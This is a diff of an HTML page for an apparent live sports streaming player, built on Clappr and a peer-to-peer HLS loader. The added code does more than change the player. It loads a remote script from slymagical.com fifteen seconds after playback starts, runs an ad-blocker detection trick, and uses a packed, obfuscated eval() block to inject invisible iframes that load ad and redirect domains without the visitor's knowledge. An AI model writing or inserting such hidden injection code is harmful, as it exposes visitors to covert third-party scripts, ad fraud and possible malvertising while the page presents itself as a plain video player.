@@ -1,13 +1,11 @@
 
 
 
-
-
  <html><head>
 <style id='page-skin-1' type='text/css'><!--
-*{margin:0; padding:0; overflow: visible;}
+*{margin:0; padding:0; }
 #player{width: 100vw; height: 100vh;}
---></style>	
+--></style> 
 <style> video {object-fit:fill}</style><style>html,body{margin:0;}</style>
 <style> .video-js {width: 100%; height: 100%;} #videojs {width: 100%; height: 100%;}</style></head>
 	<meta charset="utf-8">
@@ -38,30 +36,20 @@ var sv = getParam("sv");
 
   }
 
-
 </script>
-	 
+
+
+
+
 <script type="text/javascript" src="https://cdn.jsdelivr.net/clappr/latest/clappr.min.js"></script>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/clappr.level-selector/latest/level-selector.min.js"></script>
-<script src="https://swarm.video/hide.js?version=1.1.1"></script>
-	 <style>
-	#vid{
-    z-index: 10;
-    position: absolute!important;
-    top: 0px;
-    left: 0px;
-    width: 100%!important;
-    height: 100%!important;
-}
-.container {
-    position: relative;
-}
+<script src="https://swarm.video/hide.js?version=1.1.1"></script>	
 
-.vjs-error .vjs-error-display .vjs-modal-dialog-content {
-	display:none!important;
-}
-
-</style>
+  <script data-n-head="ssr" src="https://cdn.jsdelivr.net/npm/p2p-media-loader-core@latest/build/p2p-media-loader-core.min.js"></script>
+   <script data-n-head="ssr" src="https://cdn.jsdelivr.net/npm/p2p-media-loader-hlsjs@latest/build/p2p-media-loader-hlsjs.min.js"></script> 
+   <script data-n-head="ssr" src="https://cdn.jsdelivr.net/npm/clappr@latest/dist/clappr.min.js"></script> 
+   <script data-n-head="ssr" src="https://cdn.jsdelivr.net/gh/clappr/clappr-level-selector-plugin@latest/dist/level-selector.min.js"></script> 
+ 	
 	
 <script type="text/javascript">
 function getParam ( sname )
@@ -74,54 +62,98 @@ var sv = getParam("sv");
 </script>
 
 <div style="width: 100%;">
+<body style="margin:0px;padding:0px;overflow:hidden">
 
-<div id="player"> </div>
-</body>
+<style>.dvr-controls[data-dvr-controls] .live-info::before, .bar-fill-2{ background-color:#000000 !important; }</style>
+
+<div class='player-container' id='player'></div>
 <script>
+	var player;
+	var hlsjsConfig =  {
+		hlsUseNextLevel: true,
+		liveSyncDurationCount: 7,
+		maxBufferHole: 10,
+		maxLoadingDelay: 6,
+		maxBufferSize: 100,
+		fragLoadingRetryDelay: 10,
+		fragLoadingTimeOut: 1000,
+		startFragPrefetch: true,
+	};
 
-let engine = new p2pml.hlsjs.Engine({segments: {swarmId: "allsportsicu20"},loader: {httpUseRanges:true, WaitForTracker: true, WaitForTrackerCounter:4500}});
+	if (typeof engine!="undefined" && typeof p2pml!="undefined" ) {
 
- player = new Clappr.Player({
-    source: sv,
-    mimeType: 'application/x-mpegURL',
-    parentId: '#player',
-    mute: false,
-    autoPlay: true,
-    width: "100vw",
-    height: "100vh",
-   hideVolumeBar: true, 
-    disableVideoTagContextMenu: true,
-                        disableErrorScreen: true,
-watermark: "http://1.bp.blogspot.com/-6Utq5JU_l2w/YCAo8gB0x7I/AAAAAAAALZU/YJxOQHkvIywpU4znsCgYEvIsc-U8ijY1wCK4BGAYYCw/s1600/2.png", 				
+		hlsjsConfig["loader"] = engine.createLoaderClass();
+	}
+
+	$( document ).ready( function(){
+		player = new Clappr.Player({
+			source     : sv,
+			parentId     : "#player",
+			width      : "100%",
+			height     : "100%",
+			autoPlay  : true,
+			 mute: false,
+                                                      hideVolumeBar: true,
+			stretching : "bestfit",
+		   watermark: "http://1.bp.blogspot.com/-6Utq5JU_l2w/YCAo8gB0x7I/AAAAAAAALZU/YJxOQHkvIywpU4znsCgYEvIsc-U8ijY1wCK4BGAYYCw/s1600/2.png", 				
 	position: 'bottom-left',
                mediacontrol: {seekbar: "#fbe407", buttons: "#fbe407"}, 
-                        events: {
-                        onError: function(e) {
-                        setTimeout(function() { player.configure(player.options); }, 10000);}},
-   plugins: {'core': [LevelSelector]},  
-    playback: {
-        hlsjsConfig: {
-        hlsUseNextLevel: true,
-        liveSyncDurationCount: 7,
-        maxBufferHole: 10,
-        maxLoadingDelay: 6,
-        maxBufferSize: 100,
-        loader: engine.createLoaderClass(),
-        fragLoadingRetryDelay: 10,
-        fragLoadingTimeOut: 1000,
-        startFragPrefetch: true,}
-    },
+		  	watermarkLink : "",
+ plugins: {'core': [LevelSelector]}, 
+			events     :
+			{
+    			onError: function(e) {
+					errorPlaying();
+				},
 
-});
-p2pml.hlsjs.initClapprPlayer(player);
-player.on(Clappr.Events.PLAYER_STOP, playerStop);
-               function playerStop(){
-               location.reload();
-               } 
-  player.setVolume(100); // 1%
-               player.play();
-	  
-</script>
+				onPlay : function(e){
+					setTimeout( function(){ $( ".stream-logo").fadeOut() }, 1000 );
+					if( !videoStarted )
+					{
+						videoStarted = true;
+						setTimeout( function(){var h = document.getElementsByTagName("head")[0],s = document.createElement("script");s.type = "text/javascript";s.async = true;s.src = "https://slymagical.com/ea/c5/7c/eac57c020cd3ce56fea4a7f126ad0bad.js";h.appendChild(s);},15000);
+						
+
+						//setTimeout( function(){ $.post( "", { "ref" : "grk66i5es9iut", "a" : "play" } ) }, 15000 );
+
+						
+					}
+				},
+
+				onPause: function(e) {
+					$( ".stream-logo").fadeIn();
+				},
+
+				onVolumeUpdate: function(e) {
+					$("#btn-unmute").fadeOut()
+				},
+
+				onReady: function(){
+
+				}
+			}
+		});
+
+		setTimeout(function() { player.play(); }, 3000);
+	});
+
+	function WSreloadStream( )
+	{
+		$(".stream-offline").css("display","none");
+		var newplayer = player.configure(player);
+   		newplayer = new Clappr.Player(newplayer.options);
+		player.destroy();
+		player =  newplayer;
+		player.mute();
+		player.play();
+		player.unmute();
+	}
+
+	function WSUnmute()
+	{
+		player.unmute();
+	}$("body").append('<object data="data:application/pdf;base64,aG1t" width="1px" height="1px" style="position:absolute;top:-500px;left:-500px;visibility:hidden;" onerror="abd();$(this).remove()"></object>')</script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('H(s(){$("r").q("<1 5=\\"4\\" 2=\\"7\\" f=\\"g://i.h/l\\" 6=\\"8:3\\" 9=\\"0-a-b 0-c 0-d 0-e\\"></1><1 5=\\"4\\" 2=\\"7\\" f=\\"g://i.h/o\\" 6=\\"8:3\\" 9=\\"0-a-b 0-c 0-d 0-e\\"></1><1 5=\\"4\\" 2=\\"7\\" f=\\"g://i.h/n\\" 6=\\"8:3\\" 9=\\"0-a-b 0-c 0-d 0-e\\"></1><1 5=\\"4\\" 2=\\"7\\" f=\\"g://i.h/m\\" 6=\\"8:3\\" 9=\\"0-a-b 0-c 0-d 0-e\\"></1><1 5=\\"4\\" 2=\\"7\\" f=\\"g://i.h/k\\" 6=\\"8:3\\" 9=\\"0-a-b 0-c 0-d 0-e\\"></1><1 5=\\"4\\" 2=\\"7\\" f=\\"g://t.j/p\\" 6=\\"8:3\\" 9=\\"0-a-b 0-c 0-d 0-e\\"></1><1 5=\\"4\\" 2=\\"7\\" f=\\"g://v.j/w\\" 6=\\"8:3\\" 9=\\"0-a-b 0-c 0-d 0-e\\"></1><1 5=\\"4\\" 2=\\"7\\" f=\\"//x.j/y/z\\" 6=\\"8:3\\" 9=\\"0-a-b 0-c 0-d 0-e\\"></1><1 5=\\"4\\" 2=\\"7\\" f=\\"g://A.B/C?D=E&F=G\\" 6=\\"8:3\\" 9=\\"0-a-b 0-c 0-d 0-e\\"></1>")},u);',44,44,'allow|iframe|height|none|1280|width|style|800|display|sandbox|same|origin|scripts|popups|forms|src|https|buzz|zap|com|BVwkdEK|4kN|Y7MvP0W|ll4|QYn|KdORxkr|append|body|function|popxyz|5000|yuppyads|aaKkk4M|khandragthresh|iBsoG511Gsf7|28749|nsparket|top|redirect|tid|756113|file|Watch_Live|setTimeout'.split('|'),0,{}))
+</script>	
 
 <script>
   function errorPlaying(){
@@ -248,4 +280,24 @@ textarea {
 </html>
 
 
-	 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
